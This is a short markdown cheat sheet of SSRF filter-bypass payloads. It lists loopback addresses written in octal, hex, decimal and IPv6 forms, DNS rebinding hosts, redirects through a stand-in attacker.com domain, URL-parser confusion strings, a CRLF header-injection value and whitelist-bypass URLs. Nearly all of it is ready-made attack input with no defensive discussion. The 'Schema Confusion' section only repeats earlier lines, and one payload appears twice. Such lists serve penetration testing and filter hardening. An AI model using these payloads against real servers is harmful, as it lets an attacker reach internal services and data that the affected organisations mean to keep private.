# SSRF URL Parsing Bypass

## IP Address Encoding

### Octal
```
http://0177.0.0.1
http://0177.0000.0000.0001
```

### Hex
```
http://0x7f.0x0.0x0.0x1
http://0x7f000001
```

### Decimal
```
http://2130706433
http://2130706433
```

### Mixed
```
http://0x7f.1.1.1
http://127.0x0.0x0.1
```

### Shortened
```
http://127.1
http://0
http://0.0.0.0
http://[::1]
http://[::ffff:127.0.0.1]
http://[0:0:0:0:0:ffff:127.0.0.1]
```

## DNS Rebinding
```
# Register domain that alternates IPs
# rebinder: 127.0.0.1#attacker.com
# rbndr: rbndr.us/7f000001.c100201d.rbndr.us
```

## Redirect Bypass
```
http://attacker.com/redirect?to=http://127.0.0.1
# Server validates URL but follows redirect to internal
```

## URL Parser Confusion
```
http://127.0.0.1@attacker.com
http://attacker.com#@127.0.0.1
http://127.0.0.1\r\nX-Internal: true
```

## Schema Confusion
```
http://127.0.0.1
http://0177.0.0.1
http://0x7f000001
http://2130706433
```

## Whitelist Bypass
```
# If whitelist checks "target.com" in URL
http://target.com.attacker.com
http://target.com@127.0.0.1
http://127.0.0.1#target.com
http://127.0.0.1?.target.com
```
